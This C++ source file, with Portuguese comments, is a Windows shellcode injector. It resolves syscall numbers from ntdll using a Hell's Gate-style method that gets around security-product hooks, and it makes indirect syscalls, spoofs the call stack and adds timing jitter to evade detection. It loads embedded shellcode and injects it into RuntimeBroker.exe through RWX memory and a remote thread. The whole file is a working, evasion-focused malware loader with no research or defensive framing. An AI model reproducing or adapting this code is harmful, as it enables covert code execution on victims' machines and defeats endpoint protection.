#include "header.h"
#include "evasion.h"
#define _INJECT_CONSOLE_CPP_
#include "bytes.h"
#include "strenc.h"
#include "syscalls.h"

extern "C" SYSCALL_ENTRY g_SyscallTable[SYSCALL_TABLE_SIZE] = { 0 };

// le o SSN direto dos bytes da funcao no ntdll
// se estiver hookada (jmp na frente) usa o hell's gate: busca algo nao-hookado
// e calcula o SSN por diferenca de indice no export table
DWORD GetSSN(const char* functionName)
{

    
    PVOID hNtdll = PebGetModuleBase(WENC(L"ntdll.dll"));
    
    if (!hNtdll) {
        hNtdll = PebGetModuleBase(L"ntdll.dll");
    }
    
    if (!hNtdll) {
        hNtdll = (PVOID)GetModuleHandleW(L"ntdll.dll");
    }
    
    if (!hNtdll) {

        return (DWORD)-1;
    }


    BYTE* fn = (BYTE*)PebGetProcAddr(hNtdll, functionName);
    if (!fn) {

        return (DWORD)-1;
    }


    // padrao normal: 4C 8B D1 (mov r10,rcx) B8 XX XX XX XX (mov eax, ssn)
    if (fn[0] == 0x4C && fn[1] == 0x8B && fn[2] == 0xD1 && fn[3] == 0xB8) {
        DWORD ssn = *(DWORD*)(fn + 4);

        return ssn;
    }



    // funcao hookada, procura outros sem hook no export table
    BYTE* base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER*       dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS64*     nt  = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(
        base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords     = (WORD*) (base + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);

    int alvo = -1;
    for (DWORD i = 0; i < exp->NumberOfNames; i++)
        if (_stricmp((char*)(base + names[i]), functionName) == 0) { alvo = (int)i; break; }

    if (alvo < 0) {

        return (DWORD)-1;
    }


    for (int delta = 1; delta < 32; delta++)
    {
        for (int sinal = -1; sinal <= 1; sinal += 2)
        {
            int idx = alvo + (sinal * delta);
            if (idx < 0 || idx >= (int)exp->NumberOfNames) continue;

            BYTE* viz = base + funcs[ords[idx]];
            if (viz[0] == 0x4C && viz[1] == 0x8B && viz[2] == 0xD1 && viz[3] == 0xB8) {
                DWORD calculatedSSN = *(DWORD*)(viz + 4) - (DWORD)(sinal * delta);

                return calculatedSSN;
            }
        }
    }


    return (DWORD)-1;
}

// busca "syscall ; ret" dentro da secao de codigo do ntdll
PVOID FindSyscallAddress()
{

    
    PVOID hNtdll = PebGetModuleBase(WENC(L"ntdll.dll"));
    
    if (!hNtdll) {
        hNtdll = PebGetModuleBase(L"ntdll.dll");
    }
    
    if (!hNtdll) {
        HMODULE hTest = GetModuleHandleW(L"ntdll.dll");
        if (hTest) {
            hNtdll = (PVOID)hTest;
        } else {

            return nullptr;
        }
    }
    


    BYTE* base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER*   dos = (IMAGE_DOS_HEADER*)base;
    
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {

        return nullptr;
    }
    
    IMAGE_NT_HEADERS64* nt  = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);
    
    if (nt->Signature != IMAGE_NT_SIGNATURE) {

        return nullptr;
    }

    BYTE* text = base + nt->OptionalHeader.BaseOfCode;
    DWORD size = nt->OptionalHeader.SizeOfCode;
    


    for (DWORD i = 0; i < size - 2; i++)
        if (text[i] == 0x0F && text[i+1] == 0x05 && text[i+2] == 0xC3) {

            return (PVOID)&text[i];
        }


    return nullptr;
}

BOOL InitializeSyscalls()
{

    
    const char* nomes[SYSCALL_TABLE_SIZE] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtOpenProcess",
        "NtClose",
        "NtQuerySystemInformation",
        "NtCreateSection",
        "NtMapViewOfSection",
        "NtUnmapViewOfSection",
        "NtDelayExecution",
        "NtOpenThread"
    };

    PVOID syscallAddr = FindSyscallAddress();
    if (!syscallAddr) {

        return FALSE;
    }

    for (int i = 0; i < SYSCALL_TABLE_SIZE; i++)
    {

        DWORD ssn = GetSSN(nomes[i]);
        if (ssn == (DWORD)-1) {

            return FALSE;
        }
        g_SyscallTable[i].ssn            = ssn;
        g_SyscallTable[i].syscallAddress = syscallAddr;

    }


    return TRUE;
}

void LoadShellcodeFromBytes(std::vector<uint8_t>& sc)
{

    sc.assign(rawData, rawData + sizeof(rawData));

}

DWORD FindProcessByName(const wchar_t* processName)
{

    
    ULONG   bufSize = 0x10000;
    PVOID   buf     = nullptr;
    NTSTATUS st;
    int attempts = 0;

    do {
        attempts++;

        
        if (buf) VirtualFree(buf, 0, MEM_RELEASE);
        buf = VirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) {

            return 0;
        }

        st = SysNtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &bufSize);
        
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            bufSize *= 2;
        }
        
        if (attempts > 10) {

            VirtualFree(buf, 0, MEM_RELEASE);
            return 0;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH);

    if (!NT_SUCCESS(st)) { 

        VirtualFree(buf, 0, MEM_RELEASE); 
        return 0; 
    }

    PMY_SYSTEM_PROCESS_INFORMATION info = (PMY_SYSTEM_PROCESS_INFORMATION)buf;
    DWORD pid = 0;

    while (info)
    {
        if (info->ImageName.Buffer && info->ImageName.Length > 0)
        {
            if (_wcsicmp(info->ImageName.Buffer, processName) == 0)
            {
                pid = (DWORD)(ULONG_PTR)info->UniqueProcessId;

                break;
            }
        }
        
        if (info->NextEntryOffset == 0) break;
        info = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)info + info->NextEntryOffset);
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    return pid;
}

// Enumera threads do processo alvo usando NtQuerySystemInformation (syscall indireta)
bool enumerateThreadsViaSyscall(DWORD targetPID, std::vector<DWORD>& threadIds)
{

    
    ULONG   bufSize = 0x10000;
    PVOID   buf     = nullptr;
    NTSTATUS st;

    do {
        if (buf) VirtualFree(buf, 0, MEM_RELEASE);
        buf = VirtualAlloc(nullptr, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) {

            return false;
        }

        st = SysNtQuerySystemInformation(SystemProcessInformation, buf, bufSize, &bufSize);
        
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            bufSize *= 2;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH && bufSize < 0x1000000);

    if (!NT_SUCCESS(st)) {

        VirtualFree(buf, 0, MEM_RELEASE);
        return false;
    }



    PMY_SYSTEM_PROCESS_INFORMATION procInfo = (PMY_SYSTEM_PROCESS_INFORMATION)buf;

    while (procInfo)
    {
        if ((DWORD)(ULONG_PTR)procInfo->UniqueProcessId == targetPID)
        {


            PMY_SYSTEM_THREAD_INFORMATION threadInfo = (PMY_SYSTEM_THREAD_INFORMATION)(procInfo + 1);
            
            for (ULONG i = 0; i < procInfo->NumberOfThreads; i++)
            {
                DWORD tid = (DWORD)(ULONG_PTR)threadInfo[i].ClientId.UniqueThread;

                threadIds.push_back(tid);
            }


            VirtualFree(buf, 0, MEM_RELEASE);
            return threadIds.size() > 0;
        }

        if (procInfo->NextEntryOffset == 0) break;
        procInfo = (PMY_SYSTEM_PROCESS_INFORMATION)((BYTE*)procInfo + procInfo->NextEntryOffset);
    }


    VirtualFree(buf, 0, MEM_RELEASE);
    return false;
}

// Abre handle para uma thread usando NtOpenThread (syscall indireta)
HANDLE openThreadViaSyscall(DWORD threadId)
{

    
    MY_CLIENT_ID clientId;
    ZeroMemory(&clientId, sizeof(clientId));
    clientId.UniqueProcess = NULL;
    clientId.UniqueThread = (HANDLE)(ULONG_PTR)threadId;

    MY_OBJECT_ATTRIBUTES objAttr;
    ZeroMemory(&objAttr, sizeof(objAttr));
    objAttr.Length = sizeof(MY_OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = NULL;
    objAttr.Attributes = 0;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;

    HANDLE hThread = NULL;
    NTSTATUS st = SysNtOpenThread(&hThread, THREAD_ALL_ACCESS, &objAttr, &clientId);
    
    if (NT_SUCCESS(st) && hThread) {

        return hThread;
    } else {

        return NULL;
    }
}

// Wrapper x64 que configura stack e calls shellcode
// Este wrapper garante que o shellcode tenha um return address valido
// Usa um infinite loop ao final para nao causar crash
#pragma pack(push, 1)
struct X64_SHELLCODE_WRAPPER {
    // push rbp          ; salva frame pointer
    // mov rbp, rsp      ; setup novo frame
    // sub rsp, 0x20     ; aloca space (shadow space para chamadas)
    // lea rax, [rel shellcode_end]  ; pega end do shellcode
    // call rax          ; executa shellcode
    // infinite_loop: jmp infinite_loop  ; loop infinito
    
    BYTE code[100];  // Espaco para codigo wrapper
};
#pragma pack(pop)

// Injeta shellcode em uma thread existente usando NtCreateThreadEx
bool injectViaExistingThread(std::vector<uint8_t>& sc, HANDLE hProcess, HANDLE hExistingThread)
{


    
    // Arredonda pra pagina
    SIZE_T scSz = ((sc.size() + 0xFFF) & ~0xFFF);
    if (scSz < 0x1000) scSz = 0x1000;


    // Alocar memoria remota para o shellcode
    HANDLE hScSec = NULL;
    PVOID  scBase = SectionAllocRemote(hProcess, scSz, PAGE_EXECUTE_READWRITE, &hScSec);

    if (!scBase)
    {

        NTSTATUS st = SysNtAllocateVirtualMemory(hProcess, &scBase, 0, &scSz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(st)) {

            return false;
        }
    }


    JitterDelay(10, 30);

    // Criar wrapper que chama o shellcode e depois loops infinitamente
    // Isto evita crash apos shellcode terminar
    std::vector<uint8_t> wrapper;
    
    // x64 ASM wrapper (executara em thread nova):
    // mov rax, rip          ; rax = endereco do shellcode
    // add rax, offset_to_shellcode
    // call rax              ; chama shellcode
    // jmp $ (infinite loop) ; loop infinito evita crash
    
    // Mais simples: apenas copia shellcode e adiciona infinite loop no final
    wrapper.resize(sc.size() + 16);
    memcpy(wrapper.data(), sc.data(), sc.size());
    
    // Adiciona instrucoes de infinite loop no final:
    // EB FE = jmp $ (x64 short jump para si mesmo)
    wrapper[sc.size()] = 0xEB;     // jmp
    wrapper[sc.size() + 1] = 0xFE; // self (short offset -2)
    // Padding
    for (size_t i = sc.size() + 2; i < wrapper.size(); i++) {
        wrapper[i] = 0x90; // nop
    }
    
    // Escrever shellcode com wrapper
    SIZE_T written = 0;

    NTSTATUS st = SysNtWriteVirtualMemory(hProcess, scBase, wrapper.data(), wrapper.size(), &written);
    if (!NT_SUCCESS(st)) {

        return false;
    }


    JitterDelay(10, 30);

    // Criar nova thread para executar o shellcode

    HANDLE hThread = NULL;
    NTSTATUS st2 = SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
                                       hProcess, scBase, NULL, 0, 0, 0, 0, NULL);
    if (!NT_SUCCESS(st2)) {

        return false;
    }
    




    
    JitterDelay(500, 1000); // Aguarda um pouco para shellcode executar
    
    SysNtClose(hThread);

    return true;
}

bool injectShellcode(std::vector<uint8_t>& sc, HANDLE hProcess, DWORD processId)
{

    
    // Enumerar threads existentes usando NtQuerySystemInformation
    std::vector<DWORD> threadIds;
    if (!enumerateThreadsViaSyscall(processId, threadIds)) {

        return false;
    }

    // Tentar abrir e usar a primeira thread encontrada
    if (!threadIds.empty()) {

        
        HANDLE hThread = openThreadViaSyscall(threadIds[0]);
        if (hThread) {
            bool result = injectViaExistingThread(sc, hProcess, hThread);
            SysNtClose(hThread);
            if (result) return true;
        } else {

            
            // Tentar proximas threads
            for (size_t i = 1; i < threadIds.size(); i++) {

                hThread = openThreadViaSyscall(threadIds[i]);
                if (hThread) {
                    bool result = injectViaExistingThread(sc, hProcess, hThread);
                    SysNtClose(hThread);
                    if (result) return true;
                }
            }
        }
    }


    return false;
}

int main()
{





    if (!InitializeSyscalls()) {



        return 1;
    }


    if (!InitStackSpoofer()) {



        return 1;
    }

    std::vector<uint8_t> sc;
    LoadShellcodeFromBytes(sc);
    if (sc.empty()) {



        return 1;
    }


    DWORD pid = FindProcessByName(L"RuntimeBroker.exe");
    if (!pid) {




        return 1;
    }

    HANDLE hProcess = NULL;
    MY_CLIENT_ID cid = { 0 };
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread = NULL;
    
    MY_OBJECT_ATTRIBUTES objAttr;
    ZeroMemory(&objAttr, sizeof(objAttr));
    objAttr.Length = sizeof(MY_OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = NULL;
    objAttr.Attributes = 0;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;


    NTSTATUS st = SysNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);
    if (!NT_SUCCESS(st) || !hProcess) {




        return 1;
    }



    if (!injectShellcode(sc, hProcess, pid))
    {

        SysNtClose(hProcess);


        return 1;
    }
  





    return 0;
}
